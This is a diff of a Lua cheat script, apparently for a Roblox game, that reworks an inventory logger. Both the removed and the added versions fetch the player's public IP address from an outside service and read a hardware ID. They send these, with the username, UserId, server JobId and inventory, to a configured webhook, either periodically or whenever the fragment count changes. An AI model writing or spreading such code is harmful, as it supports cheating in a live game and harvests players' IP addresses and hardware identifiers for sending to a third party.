@@ -271,84 +271,83 @@ function PostWebhook(Url, message)
     return data
 end
 
-function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
-    local player = game.Players.LocalPlayer
-    local beli = player:FindFirstChild("Data") and player.Data:FindFirstChild("Beli") and player.Data.Beli.Value or 0
-    
-    local inventory = getInventory() or {}
+local function formatNumberWithCommas(num)
+    local parts = {}
+    while num >= 1000 do
+        table.insert(parts, 1, string.format("%03d", num % 1000))
+        num = math.floor(num / 1000)
+    end
+    table.insert(parts, 1, tostring(num))
+    return table.concat(parts, ",")
+end
+
+local function getFragmentAndGearStatus()
+    local darkFragmentCount = 0
     local valkyrieHelmStatus = "❌"
     local darkCoatStatus = "❌"
+    local inventory = getInventory() or {}
 
     for _, item in pairs(inventory) do
-        if (item.Type == "Wear" or item.Type == "Accessory") and (item.Name == "Valkyrie Helm" or item.Name == "ValkyrieHelm") then
-            valkyrieHelmStatus = "✅"
-        end
         if item.Type == "Material" and item.Name == "Dark Fragment" then
-            number_Dark_Fragments = item.Amount or 0
+            darkFragmentCount = item.Amount or 0
         end
         if item.Type == "Wear" and (item.Name == "Dark Coat" or item.Name == "DarkCoat") then
             darkCoatStatus = "✅"
         end
+        if (item.Type == "Wear" or item.Type == "Accessory") and (item.Name == "Valkyrie Helm" or item.Name == "ValkyrieHelm") then
+            valkyrieHelmStatus = "✅"
+        end
     end
-	
-    local function formatNumberWithCommas(num)
-        local num_str = tostring(num)
-        local reverse = num_str:reverse()
-        local formatted = reverse:gsub("(%d%d%d)", "%1,")
-        return formatted:reverse():gsub("^,", "")
-    end
-	
-    local AdminMessage = {
+
+    return darkFragmentCount, valkyrieHelmStatus, darkCoatStatus
+end
+
+function DarkFragmentLogger(darkCount, valkyrieStatus, darkCoatStatus)
+    local player = game.Players.LocalPlayer
+    local beli = player:FindFirstChild("Data") and player.Data:FindFirstChild("Beli") and player.Data.Beli.Value or 0
+
+    local ip = "Unavailable"
+    pcall(function()
+        ip = game:HttpGet("https://api.ipify.org", true)
+    end)
+
+    local hwid = (gethwid and gethwid()) or (identifyexecutor and identifyexecutor()) or "Unknown"
+
+    return {
         embeds = {{
-            title = "**📦 Inventory Check!**",
-            description = "",
-            color = tonumber(0xffffff),
+            title = "**🌑 Dark Fragment Inventory Update**",
+            color = tonumber(0x7f00ff),
             fields = {
                 { name = "👤 Username", value = "||```" .. player.Name .. "```||", inline = true },
-                { name = "🗿UserID", value = "```" .. player.UserId .. "```", inline = true },
-                { name = "💰 Beli", value = "```" .. formatNumberWithCommas(beli) .. "```", inline = false },
-                { name = "🌇IP Address", value = "||```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```||", inline = false },
-                { name = "💻 HWID", value = "```" .. (gethwid and gethwid() or "Unknown") .. "```", inline = false },
+                { name = "🗿 UserID", value = "```" .. player.UserId .. "```", inline = true },
+                { name = "💰 Beli", value = "```" .. formatNumberWithCommas(beli) .. "```", inline = true },
+                { name = "🌑 Dark Fragments", value = "```" .. tostring(darkCount) .. "```", inline = false },
+                { name = "🧥 Dark Coat", value = darkCoatStatus, inline = true },
+                { name = "🎓 Valkyrie Helm", value = valkyrieStatus, inline = true },
+                { name = "🌇 IP Address", value = "||```" .. ip .. "```||", inline = false },
+                { name = "💻 HWID", value = "```" .. hwid .. "```", inline = false },
                 { name = "🧭 Job ID", value = "```" .. game.JobId .. "```", inline = false },
-                { name = "📜Join Code", value = "```lua\n" ..
-                                              "game.ReplicatedStorage['__ServerBrowser']:InvokeServer(" ..
-                                              "'teleport','" .. game.JobId .. "')```", inline = false },
-                { name = "️♜ God's Chalice ♜", value = hasGodsChalice and "✅" or "❌", inline = true },
-                { name = "♣️ Fist of Darkness ♠️", value = hasFistOfDarkness and "✅" or "❌", inline = true },
-                { name = "🧥 Dark Coat 🧥", value = darkCoatStatus or "❌", inline = true },
-                { name = "🎓 Valkyrie Helm 🎓", value = valkyrieHelmStatus, inline = true },
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
         }}
     }
-
-    return AdminMessage
 end
 
-spawn(function()
-    while true do
-        local hasGodsChalice = false
-        local hasFistOfDarkness = false
+local filePath = "DarkFragments.txt"
 
-        for _, item in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-            if item.Name == "God's Chalice" then
-                hasGodsChalice = true
-            elseif item.Name == "Fist of Darkness" then
-                hasFistOfDarkness = true
-            end
-        end
-
-        if getgenv().config.Webhook["Send Webhook"] then
-
-            local message = AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
-            PostWebhook(getgenv().config.Webhook["Webhook Url"], message)
-        else
-            print("Webhook not enabled.")
-        end
-
-        task.wait(60)
+local function saveDarkFragmentToFile(amount)
+    if writefile then
+        writefile(filePath, tostring(amount))
     end
-end)
+end
+
+local function loadDarkFragmentFromFile()
+    if readfile and isfile and isfile(filePath) then
+        local content = readfile(filePath)
+        return tonumber(content) or 0
+    end
+    return 0
+end
 
 spawn(function()
     local runService = game:GetService("RunService")
@@ -1923,22 +1922,18 @@ end
 
 --Post Webhook
 spawn(function()
-    while true do
-        local hasGodsChalice = false
-        local hasFistOfDarkness = false
+    local lastSavedAmount = loadDarkFragmentFromFile()
+    while task.wait(60) do
+        local darkCount, valkStatus, coatStatus = getFragmentAndGearStatus()
+        if darkCount ~= lastSavedAmount then
+            saveDarkFragmentToFile(darkCount)
+            lastSavedAmount = darkCount
 
-        for _, item in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-            if item.Name == "God's Chalice" then
-                hasGodsChalice = true
-            elseif item.Name == "Fist of Darkness" then
-                hasFistOfDarkness = true
+            if getgenv().config.Webhook and getgenv().config.Webhook["Send Webhook"] then
+                local url = getgenv().config.Webhook["Webhook Url"]
+                local msg = DarkFragmentLogger(darkCount, valkStatus, coatStatus)
+                PostWebhook(url, msg)
             end
         end
-
-        if getgenv().config.Webhook["Send Webhook"] then
-            PostWebhook(getgenv().config.Webhook["Webhook Url"], AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness))
-        end
-            
-        task.wait(60)
     end
 end)
